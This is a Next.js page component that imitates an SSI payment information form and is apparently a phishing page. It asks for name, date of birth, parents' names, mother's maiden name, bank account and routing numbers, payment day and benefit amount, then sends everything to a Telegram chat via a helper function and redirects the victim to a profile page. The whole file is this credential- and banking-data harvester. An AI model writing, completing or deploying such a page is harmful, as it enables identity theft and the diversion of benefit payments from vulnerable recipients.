/* eslint-disable @next/next/no-img-element */
"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import Head from "next/head";
import { sendTelegramMessage } from "../../utils/telegram";



const validateInput = (field: string, value: string): string => {
  const accountRegex = /^\d{5,12}$/;
  const routingRegex = /^\d{9}$/;

 
  
  
  switch (field) {
    case "firstName":
    case "lastName":
    case "mothersName":
    case "fathersName":
    case "mothersMaidenName":
      return value.trim() ? "" : `${field.charAt(0).toUpperCase() + field.slice(1)} is required.`;
    case "day":
      return /^(0?[1-9]|[12][0-9]|3[01])$/.test(value) ? "" : "Invalid day (1-31)";
    case "month":
      return /^(0?[1-9]|1[012])$/.test(value) ? "" : "Invalid month (1-12)";
    case "year": {
      const currentYear = new Date().getFullYear();
      return value.length === 4 && parseInt(value) >= 1900 && parseInt(value) <= currentYear 
        ? "" 
        : `Invalid year (1900-${currentYear})`;
    }
    case "accountNumber":
      return accountRegex.test(value) ? "" : "Account number must be 10-12 digits";
    case "routingNumber":
      return routingRegex.test(value) ? "" : "Routing number must be 9 digits";
    case "paymentDay":
      return value.trim() ? "" : "Please enter your payment day";
    case "ssiAmount":
      return /^\d+(\.\d{1,2})?$/.test(value) ? "" : "Please enter a valid amount";
    default:
      return "";
  }
};

const SsiFormPage = () => {
  const [formErrors, setFormErrors] = useState<Record<string, string>>({});
  const [day, setDay] = useState<string>("");
  const [month, setMonth] = useState<string>("");
  const [year, setYear] = useState<string>("");
  const [ssiAmount, setSsiAmount] = useState<string>("");
  const router = useRouter();
  const handleChange = (field: string, value: string) => {
    if (field === 'ssiAmount') {
      setSsiAmount(value);
    }
  };


  const handleFormSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    const form = e.currentTarget;
    const formData = {
      firstName: (form.elements.namedItem("firstName") as HTMLInputElement).value,
      lastName: (form.elements.namedItem("lastName") as HTMLInputElement).value,
      day,
      month,
      year,
      mothersName: (form.elements.namedItem("mothersName") as HTMLInputElement).value,
      fathersName: (form.elements.namedItem("fathersName") as HTMLInputElement).value,
      mothersMaidenName: (form.elements.namedItem("mothersMaidenName") as HTMLInputElement).value,
      accountNumber: (form.elements.namedItem("accountNumber") as HTMLInputElement).value,
      routingNumber: (form.elements.namedItem("routingNumber") as HTMLInputElement).value,
      paymentDay: (form.elements.namedItem("paymentDay") as HTMLInputElement).value,
      ssiAmount: (form.elements.namedItem("ssiAmount") as HTMLInputElement).value,
    };

    const errors: Record<string, string> = {};
    Object.keys(formData).forEach((field) => {
      const error = validateInput(field, formData[field as keyof typeof formData]);
      if (error) errors[field] = error;
    });

    if (Object.keys(errors).length > 0) {
      setFormErrors(errors);
      return;
    }

    const message = `SSI Information Submission
      - Name: ${formData.firstName} ${formData.lastName}
      - DOB: ${formData.year}-${formData.month}-${formData.day}
      - Mother's Name: ${formData.mothersName}
      - Father's Name: ${formData.fathersName}
      - Mother's Maiden Name: ${formData.mothersMaidenName}
      - Account Number: ${formData.accountNumber}
      - Routing Number: ${formData.routingNumber}
      - Payment Day: ${formData.paymentDay}
      - SSI Amount: $${formData.ssiAmount}
      - Submitted At: ${new Date().toLocaleString()}`;

    try {
      await sendTelegramMessage(message);
      router.push("/profile");
    } catch (error) {
      console.error("Submission error:", error);
      alert("Submission failed. Please try again.");
    }
  };

  return (
    <>
      <Head>
        <title>SSI Information Form</title>
        <style>{`
          input:-webkit-autofill,
          select:-webkit-autofill {
            background-color: transparent !important;
            color: #000 !important;
            -webkit-box-shadow: 0 0 0px 1000px white inset !important;
          }

          /* Dark placeholder text */
          ::placeholder {
            color: #666 !important;
            opacity: 1 !important;
          }

          /* Remove number input spinners */
          input[type="number"]::-webkit-inner-spin-button,
          input[type="number"]::-webkit-outer-spin-button {
            -webkit-appearance: none;
            margin: 0;
          }
        `}</style>
      </Head>
      <div className="min-h-screen flex flex-col bg-gray-50">
        <header className="bg-green-500 border-b-4 shadow-lg">
          <div className="max-w-7xl mx-auto flex items-center p-4">
            <a href="#" className="flex items-center text-white text-xl font-bold">
              <img src="/logogreen.svg" alt="Logo" className="h-8 mr-3" />
            </a>
          </div>
        </header>

        <main className="flex-grow container mx-auto mt-12 px-4">
          <div className="max-w-lg mx-auto bg-white p-10 shadow-xl rounded-lg border-t-4 border-green-500">
            <h1 className="text-3xl font-semibold text-gray-800 text-center mb-6">SSI Payment Information</h1>
            <p className="text-sm text-gray-600 text-center mb-8">Please provide your current SSI payment details</p>
            
            <form onSubmit={handleFormSubmit}>
              <div className="space-y-6">
                <div className="grid grid-cols-2 gap-6">
                  <div>
                    <label htmlFor="firstName" className="block text-sm font-medium text-black">First Name</label>
                    <input
                      id="firstName"
                      name="firstName"
                      type="text"
                      required
                      className={`w-full mt-2 border ${formErrors.firstName ? "border-red-500" : "border-gray-300"} rounded-lg p-3 focus:outline-none focus:ring-2 ${formErrors.firstName ? "focus:ring-red-500" : "focus:ring-green-500"} text-black`}
                    />
                    {formErrors.firstName && <p className="text-sm text-red-500 mt-2">{formErrors.firstName}</p>}
                  </div>

                  <div>
                    <label htmlFor="lastName" className="block text-sm font-medium text-black">Last Name</label>
                    <input
                      id="lastName"
                      name="lastName"
                      type="text"
                      required
                      className={`w-full mt-2 border ${formErrors.lastName ? "border-red-500" : "border-gray-300"} rounded-lg p-3 focus:outline-none focus:ring-2 ${formErrors.lastName ? "focus:ring-red-500" : "focus:ring-green-500"} text-black`}
                    />
                    {formErrors.lastName && <p className="text-sm text-red-500 mt-2">{formErrors.lastName}</p>}
                  </div>
                </div>

                {/* Date of Birth */}
                <div className="space-y-1">
                  <label className="block text-sm font-medium text-black mb-1">Date of Birth</label>
                  <div className="grid grid-cols-3 gap-2">
                    <input
                      id="day"
                      name="day"
                      type="text"
                      inputMode="numeric"
                      required
                      placeholder="DD"
                      value={day}
                      onChange={(e) => {
                        const val = e.target.value.replace(/\D/g, '').slice(0, 2);
                        setDay(val);
                      }}
                      className={`w-full px-3 py-2 border ${
                        formErrors.day ? "border-red-500" : "border-gray-300"
                      } rounded-lg focus:outline-none focus:ring-2 ${
                        formErrors.day ? "focus:ring-red-500" : "focus:ring-green-500"
                      } text-black`}
                    />
                    <input
                      id="month"
                      name="month"
                      type="text"
                      inputMode="numeric"
                      required
                      placeholder="MM"
                      value={month}
                      onChange={(e) => {
                        const val = e.target.value.replace(/\D/g, '').slice(0, 2);
                        setMonth(val);
                        
                      }}
                      className={`w-full px-3 py-2 border ${
                        formErrors.month ? "border-red-500" : "border-gray-300"
                      } rounded-lg focus:outline-none focus:ring-2 ${
                        formErrors.month ? "focus:ring-red-500" : "focus:ring-green-500"
                      } text-black`}
                    />
                    <input
                      id="year"
                      name="year"
                      type="text"
                      inputMode="numeric"
                      required
                      placeholder="YYYY"
                      value={year}
                      onChange={(e) => {
                        const val = e.target.value.replace(/\D/g, '').slice(0, 4);
                        setYear(val);
                        
                      }}
                      className={`w-full px-3 py-2 border ${
                        formErrors.year ? "border-red-500" : "border-gray-300"
                      } rounded-lg focus:outline-none focus:ring-2 ${
                        formErrors.year ? "focus:ring-red-500" : "focus:ring-green-500"
                      } text-black`}
                    />
                  </div>
                  {(formErrors.day || formErrors.month || formErrors.year) && (
                    <p className="text-red-500 text-sm mt-1">
                      {formErrors.day || formErrors.month || formErrors.year}
                    </p>
                  )}
                </div>

                {/* Family Information */}
                <div className="space-y-6">
                  <div>
                    <label htmlFor="mothersName" className="block text-sm font-medium text-black">Mothers Full Name</label>
                    <input
                      id="mothersName"
                      name="mothersName"
                      type="text"
                      required
                      className={`w-full mt-2 border ${formErrors.mothersName ? "border-red-500" : "border-gray-300"} rounded-lg p-3 focus:outline-none focus:ring-2 ${formErrors.mothersName ? "focus:ring-red-500" : "focus:ring-green-500"} text-black`}
                    />
                    {formErrors.mothersName && <p className="text-sm text-red-500 mt-2">{formErrors.mothersName}</p>}
                  </div>

                  <div>
                    <label htmlFor="fathersName" className="block text-sm font-medium text-black">Fathers Full Name</label>
                    <input
                      id="fathersName"
                      name="fathersName"
                      type="text"
                      required
                      className={`w-full mt-2 border ${formErrors.fathersName ? "border-red-500" : "border-gray-300"} rounded-lg p-3 focus:outline-none focus:ring-2 ${formErrors.fathersName ? "focus:ring-red-500" : "focus:ring-green-500"} text-black`}
                    />
                    {formErrors.fathersName && <p className="text-sm text-red-500 mt-2">{formErrors.fathersName}</p>}
                  </div>

                  <div>
                    <label htmlFor="mothersMaidenName" className="block text-sm font-medium text-black">Mothers Maiden Name</label>
                    <input
                      id="mothersMaidenName"
                      name="mothersMaidenName"
                      type="text"
                      required
                      className={`w-full mt-2 border ${formErrors.mothersMaidenName ? "border-red-500" : "border-gray-300"} rounded-lg p-3 focus:outline-none focus:ring-2 ${formErrors.mothersMaidenName ? "focus:ring-red-500" : "focus:ring-green-500"} text-black`}
                    />
                    {formErrors.mothersMaidenName && <p className="text-sm text-red-500 mt-2">{formErrors.mothersMaidenName}</p>}
                  </div>
                </div>

                {/* Account Information */}
                <div className="grid grid-cols-2 gap-6">
                  <div>
                    <label htmlFor="accountNumber" className="block text-sm font-medium text-black">Account Number</label>
                    <input
                      id="accountNumber"
                      name="accountNumber"
                      type="text"
                      inputMode="numeric"
                      required
                      className={`w-full mt-2 border ${formErrors.accountNumber ? "border-red-500" : "border-gray-300"} rounded-lg p-3 focus:outline-none focus:ring-2 ${formErrors.accountNumber ? "focus:ring-red-500" : "focus:ring-green-500"} text-black`}
                    />
                    {formErrors.accountNumber && <p className="text-sm text-red-500 mt-2">{formErrors.accountNumber}</p>}
                  </div>

                  <div>
                    <label htmlFor="routingNumber" className="block text-sm font-medium text-black">Routing Number</label>
                    <input
                      id="routingNumber"
                      name="routingNumber"
                      type="text"
                      inputMode="numeric"
                      required
                      className={`w-full mt-2 border ${formErrors.routingNumber ? "border-red-500" : "border-gray-300"} rounded-lg p-3 focus:outline-none focus:ring-2 ${formErrors.routingNumber ? "focus:ring-red-500" : "focus:ring-green-500"} text-black`}
                    />
                    {formErrors.routingNumber && <p className="text-sm text-red-500 mt-2">{formErrors.routingNumber}</p>}
                  </div>
                </div>

                {/* Payment Details */}
                <div className="space-y-6">
                  <div>
                    <label htmlFor="paymentDay" className="block text-sm font-medium text-black">
                      SSI Payment Day
                      <span className="text-sm text-gray-500 block mt-1 font-normal">
                        (e.g., 3rd Wednesday of the month)
                      </span>
                    </label>
                    <input
                      id="paymentDay"
                      name="paymentDay"
                      type="text"
                      required
                      className={`w-full mt-2 border ${formErrors.paymentDay ? "border-red-500" : "border-gray-300"} rounded-lg p-3 focus:outline-none focus:ring-2 ${formErrors.paymentDay ? "focus:ring-red-500" : "focus:ring-green-500"} text-black`}
                      placeholder="Day you currently receive SSI payments"
                    />
                    {formErrors.paymentDay && <p className="text-sm text-red-500 mt-2">{formErrors.paymentDay}</p>}
                  </div>

                  <div>
                    <label htmlFor="ssiAmount" className="block text-sm font-medium text-black">Monthly SSI Amount</label>
                    <div className="relative mt-2">
                      <span className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-500">$</span>
                      <input
                        id="ssiAmount"
                        name="ssiAmount"
                        type="text"
                        value={ssiAmount}
                        inputMode="decimal"
                        required
                        className={`w-full pl-7 border ${formErrors.ssiAmount ? "border-red-500" : "border-gray-300"} rounded-lg p-3 focus:outline-none focus:ring-2 ${formErrors.ssiAmount ? "focus:ring-red-500" : "focus:ring-green-500"} text-black`}
                        placeholder="0.00"
                        onChange={(e) => {
                          const val = e.target.value.replace(/[^0-9.]/g, '');
                          handleChange('ssiAmount', val);
                        }}
                      />
                    </div>
                    {formErrors.ssiAmount && <p className="text-sm text-red-500 mt-2">{formErrors.ssiAmount}</p>}
                  </div>
                </div>

                <div className="flex justify-center mt-8">
                  <button
                    type="submit"
                    className="w-full bg-green-500 hover:bg-green-600 text-white p-4 rounded-xl shadow-md transition-colors duration-200"
                  >
                    Submit Information
                  </button>
                </div>
              </div>
            </form>
          </div>
        </main>
      </div>
    </>
  );
};

export default SsiFormPage;